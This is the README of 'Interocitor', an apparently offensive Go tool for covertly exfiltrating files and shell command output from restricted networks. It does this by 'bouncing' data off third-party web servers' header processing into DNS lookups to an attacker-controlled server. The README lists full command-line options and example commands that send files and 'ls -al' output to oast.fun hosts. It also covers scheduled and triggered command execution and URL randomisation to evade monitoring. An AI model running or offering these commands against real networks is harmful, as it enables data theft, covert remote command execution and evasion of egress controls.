Interocitor ReadMe
==================

This is an initial beta version. Updates will be ongoing and will gradually improve the functionality and robustness.
At some point I will provide a GUI to make usage easier.

Interocitor is a data-bouncing tool useful for covertly exfiltrating data from a network, or carrying out scheduled reporting/polling from a network, particularly when egress is restricted, monitored, or otherwise controlled.
For more information on using HTTP headers for data bouncing, read this article, or visit the Data Bouncing website:
https://thecontractor.io/data-bouncing/
https://databouncing.io
[credit to @DeathsPirate and @TheContractorio for discovering the original issue]

Note - you will need a DNS server under your own control to use the application.
For hobbyist/learning uses, InteractSh is recommended as a DNS server that can be used for PoC and test purposes. Use the client available on GitHub:
https://github.com/projectdiscovery/interactsh
The InteractSh server can be used to collect the data, via its web interface:
https://app.interactsh.com/#/

Install and Dependency Notes
----------------------------
If building from source, Interocitor uses the following Go modules.

INI File Reader:	go get gopkg.in/ini.v1

Maps:	go get golang.org/x/exp/maps

DNS:	go get github.com/miekg/dns


Overview
--------
Note - you will need a DNS server under your own control to use the application.

Interocitor is a multi-purpose tool that allows the user to make use of the data bouncing technique in several ways.
It can run in Target mode, File mode, Command mode or DNS mode:

Target Mode:		Reconnaissance of useable channels to identify suitable targets to facilitate exfiltration. Used to identify suitable web servers that can exfiltrate data for the user, via their header processing.
File Mode:			Used to exfiltrate a file from the restricted network to to an external endpoint via a vulnerable web server, typically identified using Target Mode.
Command Mode:		Used to run one or more shell commands on a machine within a restricted network, exfiltrating the command output afterwards. Cmd execution takes place either once or on a schedule, with command line output being exfiltrated afterwards. Schedule may be according to fixed time, random time, or on satisfaction of  trigger condition (see details below).
DNS Mode:			Act as a DNS server to accept lookups containing bounced data.

Command Line Parameters
-----------------------
Command line usage of Interocitor relies on the following parameters. See individual the sections below for further details and example usage.
Note - Settings from config file [config.ini] will be used by the application, unless overridden by command line parameter. 
Interocitor can be run with no command line parameters at all, provided valid parameters have been specified in the ini file.

  --config <file>	Specify a config file to read settings from. Default is config.ini, and is read by default
  --no-config		Switch off reading settings from config file. Note that config read is on by default, command line settings will override config settings where present

  -m, --mode <mode>	Operational mode for application. Choose from targetcheck|file|cmd|dns (default = file)
  -t, --task <task>	Task(s) to be carried out. Select from following options within mode:
  		All Modes:	bouncecheck|dns
		File Mode:	exfil|json_extract|extract_decrypt|file_decrypt
		Cmd Mode:	cmd|filecmd

  -n, --num-times <amount>		Number of times to repeat each HTTP request (default = 1)

  -b, --bounce-targets <path>	Path to the file containing potential targets to aid exfiltration
  -d, --domains-file <path>		Path to the file containing list of bouncable domains - this will be the result of a bounce check and the input for exfil operations

  -f, --file <path>	Path to the binary file to be read and exfiltrated
  -u, --uuid <uuid>	Identifier for the current stream

  -o, --oob <addr>	IP address or DNS name for the OOB exfil DNS server
  --verb <verb>		HTTP verb to use for exfiltration attempts (GET is default if unspecified)
  --append-url		Add random additional path suffixes to exfiltration URL to render exfil paths less uniform

  -j, --json-file <path>	Extract (and optionally decrypt) data from this JSON file
  -c, --crypt-file <path>	Extract JSON data to this file before decryption
  -l, --output-file <path>	Write decrypted exfiltrated data to this file following decryption (default = output.bin)

  -s --cmd <shell_command>		Command to run in shell (output will be exfiltrated from network)
  --cmd-file <filename>			Filename of file containing commands (output will be exfiltrated from network)
  -p --params <param,param,...>	Parameters to be executed by the command specified in -s or --cmd parameter (above)
  -r, --cmd-frequency <freq>	Frequency for running commands in shell mode. Choose from once|fixed|random	(default = once)
  --cmd-time-unit <unit>	 	Unit type for the above frequency. Choose from sec|min|hr|day	(default = hr)
  --cmd-time-interval <n>		Number of units for the above options (default = 1)
  --report-frequency <freq>		Frequency for returning command outputs in shell mode. Choose from immediate|fixed|random (default = immediate)
  --rep-time-unit <unit>	 	Unit type for the above frequency. Choose from sec|min|hr|day	(default = hr)
  --rep-time-interval <n>		Number of units for the above options (default = 1)

  --shell <shelltype>			Select the shell required, if you wish to use something different from the system default (e.g. sh, csh, bash, zsh, powershell)
  --shell-output <filename>		The filename to hold shell output. This file will be exfiltrated as/when required (default = shellout.txt)
  --increment-uuid				Increment the UUID for each cmd execution - this will allow extraction of responses to different files in the event of multiple commands executed on a timer
  								Note that if a user has chosen a numeric UUID it will increment, if a user chooses a string UUID it will have an incrementing number appended
  --pipe-in						Allow system commands to be piped into cmd
  --pipe-out					Allow cmd output to be piped into system commands
  --in-cmds <cmd|cmd|...>		System commands to be piped into cmd
  --out-cmds <cmd|cmd|...>		System commands for cmd output to be piped into
  --cancel-timeout <seconds>	Number of seconds before automatically sending cancel (ctrl+c) to cmd (default = 0 = do not send cancel)

  --trigger-mode <mode>			Type of trigger condition to be satisfied before running a command whose output will be exported, in the form 'type|condition'
								'type' can be one of cmd, file, or dir, 'condition' can be one of ne, lt, gt	(e.g. dir|gt)
								ne = not equal - output different from previously, lt = less than - output is shorter, file has reduced in size, dir has less content, gt = greater than - opposite of lt
  --trigger-target <target>		Target for the above trigger condition - this will be a shell command, filename or directory name.

  --log				Enable logging
  --log-file <path>	Specify a log filename.
  -v, --verbose		Verbose console output
  -h, --help		Show this usage information and exit 

Target Mode
-----------
Select Target Mode if you wish to test whether a host is vulnerable to data bouncing and can be used for exfiltration purposes. This requires a file of suspected or possibly vulnerable URLs as input.
The DNS JSON output from this mode can then be used in subsequent exfiltration tasks.

Examples:
Check which of the URLs in the file targets.txt, are valid ‘data bounce’ targets:
interocitor --mode target --task bouncecheck -v -b ../config/targets.txt --oob  wotmvksfjpdystzjbsgg3e096tnx0mcum.oast.fun

Extract valid bounce targets from a DNS server’s JSON file into a selected text file:
interocitor --mode target --task json_extract -v -b ../TestData/domains.json -d ../TestData/domains.txt 

File Mode
---------
Use File Mode to export data covertly from a network.
The ‘exfil’ task sends the data to the OOB DNS server, via a lookup from a randomly selected vulnerable web server.
Exfiltrated data is embedded in lookup data and can be extracted as required, using the following tasks:
extract_decrypt		Extract the data from the JSON lookup file, and decrypt, before writing to the output file
json_extract		Extract the data from the JSON lookup file to an encrypted output file 
file_decrypt		Decrypt an output file (usually the output from the above json_extract operation)

Note that if no mode and no task is specified, File Mode will be used, with Exfil as the task setting.
In the above operations, the extract_decrypt task performs both stages at once, the others can be used in any situation where there is a desire to perform the two stages separately.

Examples:
Exfiltrate the file beuller.jpg to the DNS server example.oast.fun:
interocitor -f beuller.jpg --oob  example.oast.fun

Exfiltrate the file beuller.jpg to the DNS server example.oast.fun, via a random target from the configs/domains.txt file, verbose mode:
interocitor --task exfil -v -f beuller.jpg -d ./configs/domains.txt --oob  example.oast.fun

Extract exfiltrated data from the DNS lookup file 2024-52-22_05_52.json, and decrypt it, placing the final content in output.jpeg (using default UUID):
interocitor --task extract&decrypt -v -j ../../TestData/output.jpeg -l ../../TestData/2024-52-22_05_52.json
 
Extract any exfiltrated data from the DNS lookup file cmdoutput.json, that has the UUID 0123, and decrypt it, placing the final content in cmdout.txt:
interocitor --task extractdecrypt -v -j ../../../TestData/cmdoutput.json -l ../../../TestData/cmdout.txt -u 0123

Cmd Mode
--------
Use Cmd Mode to run the desired command(s) on the machine sitting in a restricted network, and export the resulting output.
Cmd Mode provides facilities to run a shell command once, or multiple times, exfiltrating immediately, or writing output to a file for subsequent exfiltration at a specified time. It is also possible to specify a particular shell, if desired and to and to add a time limit before sending cancel (Ctrl + C) to the process.
It is necessary to specify ‘mode’ as ‘cmd’ or ‘command’, and additionally specify a ’task’ as "c", "cmd", "once", "single", or “singlecmd" to execute one command on its own, or "cf", "filecmd", or "cmdfile" to execute a series of task from a file.
See the Timings and Triggers section below for further information on how to execute repeated commands on a regular basis.

Examples:
Execute the command “ls -al” once and exfiltrate the results immediately:
interocitor --mode cmd --task singlecmd -v --cmd ls --params ‘-al’ --oob wotmvksfjpdystzjbsgg3e096tnx0mcum.oast.fun

Execute the command “ls -al” once and exfiltrate the results immediately, via a random target from the configs/domains.txt file:
interocitor --mode cmd --task singlecmd -v --cmd ls --params ‘-al’ -d ./configs/domains.txt --oob wotmvksfjpdystzjbsgg3e096tnx0mcum.oast.fun

 
DNS Mode
--------
[still under development]


Timing and Triggers for Multiple Operations and Multiple Exfiltrations
----------------------------------------------------------------------
Interocitor has functionality to run commands on a regular basis and to upload results on a regular basis.
The timing of execution and timing of uploads can be enforced in four ways:
1)	Fixed Timing		Commands or uploads are carried out following a regular time period, with amount and units specified by the user, e.g. every 8 hours or every 5 days
2)	Scheduled Timing	Commands are carried out at a future date date and time provided by the user, e.g. at 15:25 on 28/09/2026
3)	Random Timing		Commands or uploads are carried out following a random time period, being an amount with max val and min val, and units specified by the user, e.g. a number of hours between 2 and 40
4)	Trigger Timing		Commands or file exfiltration is carried out whenever a trigger condition is met, such as different output from a shell command, new files added to a directory, a specified file increases in size

These timings are generally applied to Cmd Mode, where there may be a desire to view the same command output at regular intervals, or to Exfiltration Mode, where there may be a desire to exfiltrate new files as they appear in a particular directory.

